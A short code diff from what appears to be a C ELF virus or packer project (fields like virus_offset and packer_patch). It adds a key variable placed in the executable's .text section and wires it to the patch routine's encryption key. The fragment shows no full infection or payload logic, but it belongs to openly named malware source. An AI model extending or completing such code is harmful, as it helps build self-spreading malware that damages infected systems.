@@ -42,6 +42,7 @@ void __attribute__((naked)) _start(void)
 }
 
 __attribute__((section(".text#"))) int g_start_offset = 0x1000;
+__attribute__((section(".text#"))) int64_t g_key = 0xdeadbeef; 
 
 static int	patch_new_file(data_t *data, const char *filename) {
 
@@ -114,7 +115,8 @@ static void init_patch(data_t *data, size_t jmp_rel_offset) {
 	patch->virus_offset = addr_diff;
 
 	patch->key = DEFAULT_KEY;
-	//patch->key = 0;
+
+	g_key = patch->key;
 }
 
 static int packer_patch(data_t *data) {
